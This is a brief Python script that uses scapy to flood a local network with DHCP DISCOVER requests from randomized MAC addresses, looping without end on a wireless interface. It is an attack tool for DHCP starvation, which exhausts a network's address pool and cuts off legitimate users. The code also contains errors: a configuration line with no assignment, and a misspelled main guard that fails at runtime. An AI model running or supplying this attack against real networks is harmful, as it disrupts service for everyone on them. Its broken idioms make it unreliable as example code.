from scapy.all import Ether,  UDP, BOOTP, DHCP, sendp, RandMAC, conf, IP

conf.checkIPaddr

src_ip = '0.0.0.0'
dst_ip =  '255.255.255.255'
options_dhcp = [('message-type', 'discover'),('end')]
dst_eth = 'ff:ff:ff:ff:ff:ff'

def net():
    dhcp = Ether(dst=dst_eth, src=RandMAC()) \
                          /IP(src=src_ip, dst=dst_ip) \
                          /UDP(sport=68, dport=67) \
                          /BOOTP(op=1, chaddr=RandMAC()) \
                          /DHCP(options=options_dhcp)
    
    sendp(dhcp, iface="wlan1", loop=1, verbose=1)

if _name_ == '_main_':
    net()
